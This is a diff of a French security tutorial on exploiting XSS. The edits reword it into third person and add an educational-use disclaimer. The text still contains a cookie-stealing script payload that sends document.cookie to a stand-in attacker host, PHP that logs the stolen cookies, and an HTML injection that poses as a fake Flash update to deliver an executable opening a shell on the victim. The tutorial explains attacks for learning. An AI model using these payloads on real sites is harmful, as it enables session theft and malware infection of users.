@@ -75,13 +75,13 @@ Voici un exemple minimaliste de page
   file_put_contents("cookies.txt", $cookie, FILE_APPEND | LOCK_EX);
 ```
 
-Enfin, pour que la victime accède à l'URL avec ses cookies, nous pouvons utiliser une redirection :
+Enfin, pour que la victime accède à l'URL avec ses cookies, l'attaquant peut utiliser une redirection :
 
 ```javascript
 document.location
 ```
 
-Cela permet de construire la charge utile finale. En reprenant l'exemple pris dans l'introduction avec l'image, nous enverrons comme description
+Cela permet de construire la charge utile finale. En reprenant l'exemple pris dans l'introduction avec l'image, l'attaquant enverra comme description
 
 ```
 Une image" /><script>document.location="http://attaquant.com/get.php?v=" + document.cookie;</script><p class="
@@ -107,7 +107,7 @@ Lorsque la victime accède à la page piégée, alors elle sera redirigée vers 
 
 ## Allons plus loin
 
-Quand beaucoup de sites s'arrêtent ici pour l'explication des failles XSS, nous allons voir comment nous pouvons prendre le contrôl total de la machine de la victime à l'aide d'une faille XSS et d'un peu de social engineering.
+Quand beaucoup de sites s'arrêtent ici pour l'explication des failles XSS, nous allons voir comment une personne mal intentionnée prendre le contrôl total de la machine de la victime à l'aide d'une faille XSS et d'un peu de social engineering.
 
 Voici l'environnement de test que j'ai mis en place pour cet exemple
 
@@ -119,7 +119,7 @@ Une petite application web (pas sécurisée du tout !) a été créée pour illu
 
 Nous l'avons vu dans la première partie de cet article, une faille XSS est présente dans la description de l'image (mais pas seulement, le nom de l'image peut être également utilisé pour exploiter la vulnérabilité par exemple).
 
-Voici le plan d'action que nous allons suivre
+Voici le plan d'action que l'attaquant peut suivre
 
 1. Création d'un exécutable qui se connectera au serveur de l'attaquant lorsqu'il est lancé
 2. Mise à disposition de cet exécutable sur un serveur de l'attaquant
@@ -160,7 +160,7 @@ La pop-up est bien apparue, notre XSS fonctionne.
 
 ### Faux plugin Flash manquant
 
-Afin que la victime télécharge notre exécutable malveillant, nous allons simuler l'absence d'un plugin flash. Pour cela, très simplement, j'ai pris une capture d'écran de ce qui est affiché quand Flash n'est pas activé
+Afin que la victime télécharge l'exécutable malveillant, nous allons simuler l'absence d'un plugin flash. Pour cela, très simplement, j'ai pris une capture d'écran de ce qui est affiché quand Flash n'est pas activé
 
 [![flash](/assets/uploads/2017/09/flash.png)](/assets/uploads/2017/09/flash.png)
 
@@ -182,7 +182,7 @@ Et voilà ce que ça donnera une fois qu'on aura exploité la faille
 <p alt='' />
 ```
 
-Cela aura pour effet d'afficher l'image `Sunset.jpg` avec le même style que les images précédantes, puis d'afficher en dessous notre image de plugin manquant, avec un lien vers notre exécutable malveillant. Si nous envoyons cela en description d'une photo, voilà ce que ça donne
+Cela aura pour effet d'afficher l'image `Sunset.jpg` avec le même style que les images précédantes, puis d'afficher en dessous l'image de plugin manquant, avec un lien vers l'exécutable malveillant. Si nous envoyons cela en description d'une photo, voilà ce que ça donne
 
 ```
 Hackndo' style='width: 100px; height: auto; padding: 10px;' /><br /><br /><a href='http://192.168.1.104/flash_update.exe'><img src='http://192.168.1.104/flash.png' /></a><p alt='
@@ -192,13 +192,13 @@ Hackndo' style='width: 100px; height: auto; padding: 10px;' /><br /><br /><a hre
 
 ### Exploitation
 
-Tout est prêt. Il suffit maintenant qu'un utilisateur peu averti passe sur le site, pense qu'un plugin flash est manquant ou désactivé pour voir le contenu du site. Il va alors cliquer sur `Activate Adobe Flash`, ce qui lui fera télécharger notre exécutable `flash_update.exe`. En le lançant, il va se connecter au serveur de l'attaquant, permettant à ce dernier d'avoir la main sur la machine de la victime.
+Tout est prêt. Il suffit maintenant qu'un utilisateur peu averti passe sur le site, pense qu'un plugin flash est manquant ou désactivé pour voir le contenu du site. Il va alors cliquer sur `Activate Adobe Flash`, ce qui lui fera télécharger l'exécutable `flash_update.exe`. En le lançant, il va se connecter au serveur de l'attaquant, permettant à ce dernier d'avoir la main sur la machine de la victime.
 
 [![sessionstart](/assets/uploads/2017/09/sessionstart.png)](/assets/uploads/2017/09/sessionstart.png)
 
 [![session](/assets/uploads/2017/09/session.png)](/assets/uploads/2017/09/session.png)
 
-Nous avons ouvert la session et lancé un shell sur la machine de la victime, puis nous avons créé un fichier vide appelé `HACKED_BY_PIXIS.txt` sur le bureau de la victime.
+L'attaquant peut alors ouvrir la session et lancer un shell sur la machine de la victime, puis il peut par exemple créer un fichier vide appelé `HACKED_BY_PIXIS.txt` sur le bureau de la victime. Bien évidemment, je rappelle que nous sommes dans un environnement de test [à des fins éducatives](/disclaimer), et les machines sur lesquelles cet exemple a été fait sont toutes des machines virtuelles m'appartenant.
 
 [![desktop](/assets/uploads/2017/09/desktop.png)](/assets/uploads/2017/09/desktop.png)
 
